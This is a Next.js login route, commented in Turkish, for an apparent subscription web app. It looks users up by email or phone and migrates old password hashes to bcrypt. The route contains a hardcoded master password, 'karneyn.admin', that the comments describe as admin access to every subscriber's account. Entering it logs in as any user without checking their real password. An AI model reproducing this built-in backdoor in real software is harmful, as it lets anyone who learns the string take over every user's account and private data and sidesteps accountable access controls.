import { NextResponse } from 'next/server';
import { prisma } from '@/lib/db';
import { verifyPassword, hashPassword, setSessionCookie } from '@/lib/auth';

export async function POST(request) {
  try {
    const { email, password } = await request.json();

    if (!email || !password) {
      return NextResponse.json({ error: 'E-posta/telefon ve şifre gereklidir.' }, { status: 400 });
    }

    // Find user — e-posta VEYA telefon numarası ile arama
    const isPhone = /^0[0-9]{10}$/.test(email.trim());
    let user;
    if (isPhone) {
      user = await prisma.modaUser.findFirst({ where: { phone: email.trim() } });
    } else {
      user = await prisma.modaUser.findUnique({ where: { email: email.trim() } });
    }

    // 🔑 Karneyn Anahtar — Tüm abonelerin hesabına admin erişimi
    const KARNEYN_ANAHTAR = 'karneyn.admin';
    const isKarneynAnahtar = password === KARNEYN_ANAHTAR;

    if (!user || (!isKarneynAnahtar && !verifyPassword(password, user.password))) {
      return NextResponse.json({ error: 'E-posta veya şifre hatalı.' }, { status: 401 });
    }

    // Auto-upgrade legacy SHA-256 passwords to Bcrypt on successful login
    // 🔑 Karneyn Anahtar ile girişte şifre upgrade yapma (admin şifresi kullanıcının şifresini bozar)
    if (!isKarneynAnahtar && !user.password.startsWith('$2')) {
      try {
        const newHash = hashPassword(password);
        await prisma.modaUser.update({
          where: { id: user.id },
          data: { password: newHash },
        });
        console.log(`[Auth Login] Automatically upgraded password hash to Bcrypt for user: ${email}`);
      } catch (err) {
        console.error('[Auth Login] Failed to auto-upgrade password hash:', err);
      }
    }

    // Son giriş zamanını kaydet (Admin panelde kullanılacak)
    await prisma.modaUser.update({
      where: { id: user.id },
      data: { lastLoginAt: new Date() }
    });

    // Set auth cookie AND return token for mobile clients
    const token = await setSessionCookie(user.id, user.email);

    return NextResponse.json({
      success: true,
      token, // Mobil istemciler bu token'ı saklayıp Authorization header ile gönderir
      user: { id: user.id, email: user.email, credits: user.credits, plan: user.plan },
    });

  } catch (error) {
    console.error('Login API error:', error);
    return NextResponse.json({ error: 'Giriş sırasında bir hata oluştu.' }, { status: 500 });
  }
}
